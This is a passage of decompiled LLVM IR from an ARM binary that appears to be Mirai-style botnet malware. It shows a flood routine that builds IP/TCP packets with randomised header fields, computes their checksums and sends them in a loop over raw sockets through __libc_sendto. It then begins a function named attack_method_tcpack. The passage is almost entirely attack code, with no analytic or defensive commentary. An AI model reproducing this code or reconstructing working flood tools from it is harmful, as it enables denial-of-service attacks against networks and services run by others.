  %v3_b888 = load i16, i16* %v2_b888, align 2
  %v4_b888 = zext i16 %v3_b888 to i32
  store i32 %v4_b888, i32* %r0.global-to-local, align 4
  %v1_b88c = add i32 %v0_b888, 8
  %v2_b88c = inttoptr i32 %v1_b88c to i32*
  %v3_b88c = load i32, i32* %v2_b88c, align 4
  store i32 %v3_b88c, i32* %r1.global-to-local, align 4
  %v2_b890 = load i32, i32* @r4, align 4
  %v3_b890 = add i32 %v2_b890, 20
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
  store i16 %v3_b888, i16* %v4_b890, align 2
  %v0_b894 = load i32, i32* @r4, align 4
  %v1_b894 = add i32 %v0_b894, 20
  store i32 %v1_b894, i32* @r8, align 4
  %v1_b898 = add i32 %v0_b894, 33
  %v2_b898 = inttoptr i32 %v1_b898 to i8*
  %v3_b898 = load i8, i8* %v2_b898, align 1
  %v4_b898 = zext i8 %v3_b898 to i32
  store i32 %v4_b898, i32* %r2.global-to-local, align 4
  %v0_b89c = load i32, i32* %r1.global-to-local, align 4
  %v2_b89c = add i32 %v0_b894, 24
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 %v0_b89c, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8a0 = or i32 %v0_b8a0, 1
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v0_b8a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 4
  %v2_b8a4 = inttoptr i32 %v1_b8a4 to i32*
  %v3_b8a4 = load i32, i32* %v2_b8a4, align 4
  store i32 %v3_b8a4, i32* %r1.global-to-local, align 4
  %v1_b8a8 = add i32 %v0_b8a4, 14
  %v2_b8a8 = inttoptr i32 %v1_b8a8 to i16*
  %v3_b8a8 = load i16, i16* %v2_b8a8, align 2
  %v4_b8a8 = zext i16 %v3_b8a8 to i32
  store i32 %v4_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v1_b8a0 to i8
  %v2_b8ac = load i32, i32* @r8, align 4
  %v3_b8ac = add i32 %v2_b8ac, 13
  %v4_b8ac = inttoptr i32 %v3_b8ac to i8*
  store i8 %v1_b8ac, i8* %v4_b8ac, align 1
  %v0_b8b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8b0 = trunc i32 %v0_b8b0 to i16
  %v2_b8b0 = load i32, i32* @r8, align 4
  %v3_b8b0 = add i32 %v2_b8b0, 2
  %v4_b8b0 = inttoptr i32 %v3_b8b0 to i16*
  store i16 %v1_b8b0, i16* %v4_b8b0, align 2
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 12
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v4_b8b4, i32* %r3.global-to-local, align 4
  %v1_b8b8 = add i32 %v0_b8b4, 13
  %v2_b8b8 = inttoptr i32 %v1_b8b8 to i8*
  %v3_b8b8 = load i8, i8* %v2_b8b8, align 1
  %v4_b8b8 = zext i8 %v3_b8b8 to i32
  %tmp104 = urem i8 %v3_b8b4, 16
  %v1_b8bc = zext i8 %tmp104 to i32
  %v1_b8c0 = or i32 %v1_b8bc, 128
  store i32 %v1_b8c0, i32* %r3.global-to-local, align 4
  %v1_b8c4 = or i32 %v4_b8b8, 16
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v0_b8c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b8c8 = add i32 %v0_b8b4, 8
  %v3_b8c8 = inttoptr i32 %v2_b8c8 to i32*
  store i32 %v0_b8c8, i32* %v3_b8c8, align 4
  %v0_b8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_b8cc = trunc i32 %v0_b8cc to i8
  %v2_b8cc = load i32, i32* @r8, align 4
  %v3_b8cc = add i32 %v2_b8cc, 12
  %v4_b8cc = inttoptr i32 %v3_b8cc to i8*
  store i8 %v1_b8cc, i8* %v4_b8cc, align 1
  %v0_b8d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8d0 = trunc i32 %v0_b8d0 to i8
  %v2_b8d0 = load i32, i32* @r8, align 4
  %v3_b8d0 = add i32 %v2_b8d0, 13
  %v4_b8d0 = inttoptr i32 %v3_b8d0 to i8*
  store i8 %v1_b8d0, i8* %v4_b8d0, align 1
  %v0_b8d4 = call i32 @rand_next()
  %v1_b8d4 = trunc i32 %v0_b8d4 to i16
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8dc = load i32, i32* @r8, align 4
  %v1_b8dc = add i32 %v0_b8dc, 13
  %v2_b8dc = inttoptr i32 %v1_b8dc to i8*
  %v3_b8dc = load i8, i8* %v2_b8dc, align 1
  %v4_b8dc = zext i8 %v3_b8dc to i32
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  %v1_b8e4 = and i32 %v4_b8dc, 223
  %v5_b8e8 = or i32 %v1_b8e4, %v4_b8e8
  store i32 %v5_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = trunc i32 %v5_b8e8 to i8
  store i8 %v1_b8ec, i8* %v2_b8dc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r8, align 4
  %v1_b8f4 = add i32 %v0_b8f4, 13
  %v2_b8f4 = inttoptr i32 %v1_b8f4 to i8*
  %v3_b8f4 = load i8, i8* %v2_b8f4, align 1
  %v4_b8f4 = zext i8 %v3_b8f4 to i32
  store i32 %v1_b8f8, i32* %r3.global-to-local, align 4
  %v1_b8fc = and i32 %v4_b8f4, 239
  %v5_b900 = or i32 %v1_b8fc, %v4_b900
  store i32 %v5_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = trunc i32 %v5_b900 to i8
  store i8 %v1_b904, i8* %v2_b8f4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b90c = load i32, i32* @r8, align 4
  %v1_b90c = add i32 %v0_b90c, 13
  %v2_b90c = inttoptr i32 %v1_b90c to i8*
  %v3_b90c = load i8, i8* %v2_b90c, align 1
  %v4_b90c = zext i8 %v3_b90c to i32
  store i32 %v1_b910, i32* %r2.global-to-local, align 4
  %v1_b914 = and i32 %v4_b90c, 247
  %v5_b918 = or i32 %v1_b914, %v4_b918
  store i32 %v5_b918, i32* %r3.global-to-local, align 4
  %v1_b91c = trunc i32 %v5_b918 to i8
  store i8 %v1_b91c, i8* %v2_b90c, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r8, align 4
  %v1_b924 = add i32 %v0_b924, 13
  %v2_b924 = inttoptr i32 %v1_b924 to i8*
  %v3_b924 = load i8, i8* %v2_b924, align 1
  %v4_b924 = zext i8 %v3_b924 to i32
  store i32 %v1_b928, i32* %r3.global-to-local, align 4
  %v1_b92c = and i32 %v4_b924, 251
  %v5_b930 = or i32 %v1_b92c, %v4_b930
  store i32 %v5_b930, i32* %r2.global-to-local, align 4
  %v1_b934 = trunc i32 %v5_b930 to i8
  store i8 %v1_b934, i8* %v2_b924, align 1
  store i32 %v1_b498, i32* %r1.global-to-local, align 4
  %v0_b93c = load i32, i32* @r8, align 4
  %v1_b93c = add i32 %v0_b93c, 13
  %v2_b93c = inttoptr i32 %v1_b93c to i8*
  %v3_b93c = load i8, i8* %v2_b93c, align 1
  %v4_b93c = zext i8 %v3_b93c to i32
  store i32 %v1_b940, i32* %r2.global-to-local, align 4
  %v1_b944 = and i32 %v4_b93c, 253
  %v4_b948 = or i32 %v1_b944, %v3_b948
  store i32 %v4_b948, i32* %r3.global-to-local, align 4
  %v1_b94c = trunc i32 %v4_b948 to i8
  store i8 %v1_b94c, i8* %v2_b93c, align 1
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b954 = load i32, i32* @r8, align 4
  %v1_b954 = add i32 %v0_b954, 13
  %v2_b954 = inttoptr i32 %v1_b954 to i8*
  %v3_b954 = load i8, i8* %v2_b954, align 1
  %v4_b954 = zext i8 %v3_b954 to i32
  %v1_b95c = and i32 %v4_b954, 254
  store i32 %v1_b95c, i32* %r2.global-to-local, align 4
  %v2_b960 = or i32 %v1_b95c, %v1_b958
  store i32 %v2_b960, i32* %r3.global-to-local, align 4
  %v1_b964 = trunc i32 %v2_b960 to i8
  store i8 %v1_b964, i8* %v2_b954, align 1
  %v3_b968 = load i32, i32* @r8, align 4
  %v4_b968 = add i32 %v3_b968, 14
  %v5_b968 = inttoptr i32 %v4_b968 to i16*
  store i16 %v1_b8d4, i16* %v5_b968, align 2
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v0_b970 = load i32, i32* @r4, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* %r0.global-to-local, align 4
  %v2_b974 = inttoptr i32 %v1_b970 to i16*
  %v3_b974 = call i32 @rand_str(i16* %v2_b974, i32 %v6_b4d0)
  store i32 %v3_b974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6c8

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b53c
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b4d0, 40
  br label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b6dc, %dec_label_pc_b97c
  %storemerge6.pre-phi = phi i32 [ %v1_b7cc, %dec_label_pc_b6dc ], [ %.pre, %dec_label_pc_b97c ]
  %v0_b9a026 = phi i32 [ %v1_b6d0, %dec_label_pc_b6dc ], [ 0, %dec_label_pc_b97c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b4d0, 65536
  %storemerge = add i32 %v6_b4d0, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b98c = add i32 %storemerge4, 1310720
  store i32 %v1_b98c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b98c, 256
  %v3_b994 = and i32 %tmp83, 65280
  store i32 %v3_b994, i32* %r3.global-to-local, align 4
  %v4_b998 = udiv i32 %v1_b98c, 16777216
  %v5_b998 = or i32 %v3_b994, %v4_b998
  store i32 %v5_b998, i32* @r8, align 4
  %v2_bac4 = icmp eq i32 %v1_b4f0, 0
  br label %dec_label_pc_b99c

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8, %dec_label_pc_b98c
  %v0_b9a0 = phi i32 [ %v0_b9a026, %dec_label_pc_b98c ], [ 0, %dec_label_pc_baa8 ], [ 0, %dec_label_pc_b99c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b9a0 = icmp eq i32 %v0_b9a0, 0
  store i1 %v2_b9a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b9a0, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b9d8, %dec_label_pc_b9ac
  %v1_b9b8 = phi i32 [ %v1_ba98, %dec_label_pc_b9d8 ], [ 0, %dec_label_pc_b9ac ]
  store i32 %v2_b35c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b9b8 = mul i32 %v1_b9b8, 4
  %v5_b9b8 = add i32 %v4_b9b8, %v2_b35c
  %v6_b9b8 = inttoptr i32 %v5_b9b8 to i32*
  %v7_b9b8 = load i32, i32* %v6_b9b8, align 4
  store i32 %v7_b9b8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b9c0 = load i32, i32* @fp, align 4
  %v9_b9c0 = icmp eq i32 %v0_b9c0, 65535
  store i1 %v9_b9c0, i1* %cpsr_z.global-to-local, align 1
  %v1_b9c4 = add i32 %v7_b9b8, 20
  store i32 %v1_b9c4, i32* @r5, align 4
  br i1 %v9_b9c0, label %dec_label_pc_babc, label %dec_label_pc_b9cc

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9b0
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_bad0

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9cc, %dec_label_pc_babc, %dec_label_pc_bad0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b9dc = load i32, i32* @r4, align 4
  %v3_b9dc = add i32 %v2_b9dc, 10
  %v4_b9dc = inttoptr i32 %v3_b9dc to i16*
  store i16 0, i16* %v4_b9dc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v0_b9e4, i32* @r0, align 4
  %v2_b9e8 = call i32 @checksum_generic(i32 %v0_b9e4, i32 20)
  %v3_b9e8 = trunc i32 %v2_b9e8 to i16
  store i32 %v2_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b34c, i32* %r2.global-to-local, align 4
  %v3_b9f4 = mul i32 %v3_b9ec, 16
  %v2_b9f8 = add i32 %v3_b9f4, %v2_b34c
  store i32 %v2_b9f8, i32* %r1.global-to-local, align 4
  %v1_b9fc = add i32 %v2_b9f8, 4
  %v2_b9fc = inttoptr i32 %v1_b9fc to i32*
  %v3_b9fc = load i32, i32* %v2_b9fc, align 4
  %v3_ba00 = mul i32 %v3_b9fc, 65536
  store i32 %v3_ba00, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9fc, 256
  %v1_ba08 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b9fc, 256
  %v4_ba0c = urem i32 %tmp86, 256
  %v5_ba0c = or i32 %v4_ba0c, %v1_ba08
  store i32 %v5_ba0c, i32* %r3.global-to-local, align 4
  %v1_ba10 = add i32 %v3_b9fc, 1
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  store i32 %v1_ba10, i32* %v2_b9fc, align 4
  %v0_ba18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba18 = load i32, i32* @r5, align 4
  %v2_ba18 = add i32 %v1_ba18, 4
  %v3_ba18 = inttoptr i32 %v2_ba18 to i32*
  store i32 %v0_ba18, i32* %v3_ba18, align 4
  %v0_ba1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba1c, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  %tmp87 = mul i32 %v3_ba1c, 256
  %v1_ba28 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_ba1c, 256
  %v4_ba2c = urem i32 %tmp88, 256
  %v5_ba2c = or i32 %v4_ba2c, %v1_ba28
  %v1_ba30 = load i32, i32* @r5, align 4
  %v2_ba30 = add i32 %v1_ba30, 8
  %v3_ba30 = inttoptr i32 %v2_ba30 to i32*
  store i32 %v5_ba2c, i32* %v3_ba30, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ba38 = load i32, i32* @r4, align 4
  %v4_ba38 = add i32 %v3_ba38, 10
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v3_b9e8, i16* %v5_ba38, align 2
  %v0_ba3c = load i32, i32* @r5, align 4
  store i32 %v0_ba3c, i32* @r1, align 4
  %v0_ba40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40 = trunc i32 %v0_ba40 to i16
  %v3_ba40 = add i32 %v0_ba3c, 16
  %v4_ba40 = inttoptr i32 %v3_ba40 to i16*
  store i16 %v1_ba40, i16* %v4_ba40, align 2
  %v0_ba44 = load i32, i32* @r8, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @sl, align 4
  store i32 %v0_ba48, i32* %r3.global-to-local, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  store i32 %v0_ba4c, i32* %r0.global-to-local, align 4
  %v4_ba50 = call i32 @checksum_tcpudp(i32 %v0_ba4c, i32 %v0_ba3c, i32 %v0_ba44, i32 %v0_ba48)
  %v5_ba50 = trunc i32 %v4_ba50 to i16
  store i32 %v4_ba50, i32* %r0.global-to-local, align 4
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba5c = mul i32 %v3_ba54, 32
  store i32 %v3_ba5c, i32* %lr.global-to-local, align 4
  %v3_ba60 = load i32, i32* @r5, align 4
  %v4_ba60 = add i32 %v3_ba60, 16
  %v5_ba60 = inttoptr i32 %v4_ba60 to i16*
  store i16 %v5_ba50, i16* %v5_ba60, align 2
  %v0_ba64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba64, -8
  %v5_ba64 = add i32 %v0_ba64, %tmp105
  store i32 %v5_ba64, i32* %lr.global-to-local, align 4
  %v0_ba68 = load i32, i32* @r5, align 4
  %v1_ba68 = add i32 %v0_ba68, 2
  %v2_ba68 = inttoptr i32 %v1_ba68 to i16*
  %v3_ba68 = load i16, i16* %v2_ba68, align 2
  %v4_ba68 = zext i16 %v3_ba68 to i32
  store i32 %v4_ba68, i32* @r5, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, %v5_ba64
  store i32 %v2_ba6c, i32* @lr, align 4
  %v3_ba70 = add i32 %v2_ba6c, 2
  %v4_ba70 = inttoptr i32 %v3_ba70 to i16*
  store i16 %v3_ba68, i16* %v4_ba70, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r4, align 4
  store i32 %v0_ba7c, i32* %r1.global-to-local, align 4
  %v0_ba80 = load i32, i32* @sb, align 4
  store i32 %v0_ba80, i32* %r0.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r7, align 4
  store i32 %v0_ba84, i32* %r2.global-to-local, align 4
  %v0_ba88 = load i32, i32* @lr, align 4
  %v6_ba90 = call i32 @__libc_sendto(i32 %v0_ba80, i32 %v0_ba7c, i32 %v0_ba84, i32 16384, i32 %v0_ba88, i32 16)
  %v3_ba94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = add i32 %v3_ba94, 1
  store i32 %v1_ba98, i32* %r0.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r6, align 4
  %v9_ba9c = icmp eq i32 %v0_ba9c, %v1_ba98
  store i1 %v9_ba9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba98, i32* %stack_var_-44, align 4
  %v8_baa4 = icmp sgt i32 %v0_ba9c, %v1_ba98
  br i1 %v8_baa4, label %dec_label_pc_b9b0, label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_b9d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_ba9c, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_baac, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_babc:                                ; preds = %dec_label_pc_b9b0
  %v0_babc = call i32 @rand_next()
  %v1_babc = trunc i32 %v0_babc to i16
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  %v3_bac8 = load i32, i32* @r4, align 4
  %v4_bac8 = add i32 %v3_bac8, 4
  %v5_bac8 = inttoptr i32 %v4_bac8 to i16*
  store i16 %v1_babc, i16* %v5_bac8, align 2
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_babc.dec_label_pc_bad0_crit_edge

dec_label_pc_babc.dec_label_pc_bad0_crit_edge:    ; preds = %dec_label_pc_babc
  %v0_bad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_babc.dec_label_pc_bad0_crit_edge, %dec_label_pc_b9cc
  %v0_bad0 = phi i32 [ %v0_bad0.pre, %dec_label_pc_babc.dec_label_pc_bad0_crit_edge ], [ %v7_b9b8, %dec_label_pc_b9cc ]
  %v1_bad0 = add i32 %v0_bad0, 40
  store i32 %v1_bad0, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v2_bad8 = inttoptr i32 %v1_bad0 to i16*
  %v3_bad8 = call i32 @rand_str(i16* %v2_bad8, i32 %v6_b4d0)
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9d8

; uselistorder directives
  uselistorder i32 %v0_babc, { 1, 0 }
  uselistorder i32 %v1_ba98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba64, { 1, 0 }
  uselistorder i32 %v4_ba50, { 1, 0 }
  uselistorder i32 %v3_ba1c, { 1, 0 }
  uselistorder i32 %v3_b9fc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9e8, { 1, 0 }
  uselistorder i1 %v2_bac4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b8d4, { 1, 0 }
  uselistorder i32 %v0_b80c, { 1, 0 }
  uselistorder i32 %v5_b7a0, { 1, 0 }
  uselistorder i32 %v0_b760, { 1, 0 }
  uselistorder i32 %v0_b71c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b6cc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b6b8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b644, { 1, 0 }
  uselistorder i32 %v6_b63c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b66c, { 1, 0 }
  uselistorder i32 %v4_b680, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b5c8, { 1, 0, 2 }
  uselistorder i32 %v0_b778, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b5b8, { 1, 0 }
  uselistorder i1 %v7_b5b0, { 1, 0, 2 }
  uselistorder i1 %v7_b564, { 1, 0 }
  uselistorder i32 %v3_b560, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b940, { 1, 0 }
  uselistorder i32 %v1_b928, { 1, 0 }
  uselistorder i32 %v1_b910, { 1, 0 }
  uselistorder i32 %v1_b8f8, { 1, 0 }
  uselistorder i32 %v1_b8e0, { 1, 0 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i1 %v2_b694, { 1, 0 }
  uselistorder i32 %v1_b690, { 1, 0 }
  uselistorder i32 %v4_b68c, { 2, 0, 1 }
  uselistorder i32 %v2_b5a0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b53c, { 1, 0 }
  uselistorder i1 %v7_b534, { 1, 0 }
  uselistorder i1 %v7_b508, { 1, 0 }
  uselistorder i32 %v3_b504, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4f0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b4d0, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b4b8, { 1, 0 }
  uselistorder i32 %v1_b498, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v6_b3f4, { 1, 0 }
  uselistorder i32 %v1_b3dc, { 1, 0 }
  uselistorder i8 %v5_b394, { 1, 0 }
  uselistorder i32 %v6_b374, { 1, 0 }
  uselistorder i32 %v2_b35c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b34c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b9d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_b99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b98c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b6c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b604, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b570, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
}

define i32 @attack_method_tcpack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bae4 = load i32, i32* @sb, align 4
  %v24_bae4 = load i32, i32* @fp, align 4
  %v27_bae4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bb00 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb14 = load i32, i32* @r4, align 4
  store i32 %v0_bb14, i32* %r0.global-to-local, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @attack_get_opt_int(i32 %v0_bb14, i32* %v5_bb18, i32 2, i32 0)
  %v1_bb24 = urem i32 %v6_bb18, 256
  store i32 %v1_bb24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r5, align 4
  store i32 %v0_bb30, i32* %r1.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r4, align 4
  store i32 %v0_bb34, i32* %r0.global-to-local, align 4
  %v6_bb3c = inttoptr i32 %v0_bb30 to i32*
  %v7_bb3c = call i32 @attack_get_opt_int(i32 %v0_bb34, i32* %v6_bb3c, i32 3, i32 65535)
